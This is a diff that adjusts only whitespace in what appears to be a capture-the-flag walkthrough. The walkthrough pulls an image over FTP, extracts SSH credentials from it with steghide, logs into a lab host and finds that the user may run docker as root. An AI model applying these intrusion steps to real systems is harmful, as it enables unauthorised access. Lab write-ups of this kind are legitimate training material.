@@ -59,7 +59,7 @@ ftp> get cmd.jpeg
 local: cmd.jpeg remote: cmd.jpeg
 229 Entering Extended Passive Mode (|||24212|)
 150 Opening BINARY mode data connection for cmd.jpeg (13414 bytes).
-100% |******************************************************************************************| 13414      103.16 MiB/s    00:00 ETA
+100% |******************************************************************************| 13414    103.16 MiB/s  00:00 ETA
 226 Transfer complete.
 13414 bytes received in 00:00 (188.44 KiB/s)
 ftp>
@@ -78,20 +78,20 @@ wrote extracted data to "creds.txt".
 That was no passphrase steghide.
 
 ```bash
-kali@kali:cat creds.txt                                                                                                                      
+kali@kali:cat creds.txt
 ssh user: stego / password: St...s!
 ```
 
 We have ssh credentials. Let's login via ssh as user stego.
 
 ```bash
-kali@kali:ssh stego@192.168.5.131                                                                                                            
+kali@kali:ssh stego@192.168.5.131
 The authenticity of host '192.168.5.131 (192.168.5.131)' can't be established.
 ED25519 key fingerprint is: SHA256:wByD1NlrahFUA5tiP7XfDN4EyWcunG21hZogswDQyX0
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '192.168.5.131' (ED25519) to the list of known hosts.
-stego@192.168.5.131's password: 
+stego@192.168.5.131's password:
 Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-84-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -140,7 +140,7 @@ Let's check the sudo privileges.
 stego@thundercipher:~$ sudo -l
 [sudo] password for stego: 
 Matching Defaults entries for stego on thundercipher:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,use_pty
 
 User stego may run the following commands on thundercipher:
     (ALL) /usr/bin/docker
